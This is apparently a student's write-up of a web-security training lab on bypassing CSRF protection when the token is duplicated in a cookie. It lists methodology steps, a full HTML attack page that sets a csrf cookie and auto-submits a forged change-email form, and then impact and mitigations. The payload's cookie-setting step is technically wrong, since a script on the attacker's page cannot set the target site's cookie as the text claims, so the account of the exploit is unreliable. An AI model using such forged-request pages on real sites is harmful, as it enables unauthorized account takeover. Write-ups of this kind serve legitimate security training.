# Lab Name
CSRF where token is duplicated in cookie

## Vulnerability
Cross-Site Request Forgery (CSRF) – Token Duplicated in Cookie

## Objective
Exploit a CSRF vulnerability where the application validates only that the CSRF token matches the value stored in a cookie, allowing an attacker to control both values and change the victim's email address.

## Entry Point
Change Email functionality

## Exploitation Type
Cross-Site Request Forgery (CSRF)

## Methodology
1. Open the lab and log in using the provided credentials

2. Navigate to the "My Account" page

3. Change the email address and intercept the request using Burp Suite

4. Observe that the CSRF token is present both as a request parameter and in a cookie

5. Verify that the application only checks whether both values are identical

6. Create a CSRF exploit that sets an attacker-controlled csrf cookie

7. Include the same value in the csrf request parameter

8. Upload the exploit to the Exploit Server

9. Deliver the exploit to the victim

10. When the victim visits the malicious page, the browser sets the attacker-controlled cookie and submits the forged request

11. Observe that the application accepts the request because both CSRF values match, solving the lab

## Payload Used

```html
<html>
  <body>
    <script>
      document.cookie = "csrf=Yast9IaseKKJ3hISFoqfMalTqg2GkGuL";
    </script>

    <form action="https://0abb00f803c57ae881e68f4e00ac00b7.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="xyz@gmail.com">
      <input type="hidden" name="csrf" value="Yast9IaseKKJ3hISFoqfMalTqg2GkGuL">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Result
Successfully bypassed the CSRF protection by supplying matching attacker-controlled values in both the CSRF cookie and request parameter, resulting in an unauthorized email change.

## Impact
- Unauthorized account modifications
- Bypass of CSRF protection
- User impersonation
- Account takeover opportunities
- Sensitive information modification

## Mitigation
- Store CSRF tokens server-side and bind them to the user's session
- Never validate CSRF tokens by simply comparing them with a client-controlled cookie
- Generate unique, unpredictable CSRF tokens for each session
- Validate Origin and Referer headers
- Use SameSite cookies for additional protection

## Learning
Duplicating the CSRF token in a cookie is insecure if the application only verifies that the cookie value matches the request parameter.
Since both values are client-controlled, an attacker can supply matching values and bypass the CSRF protection.
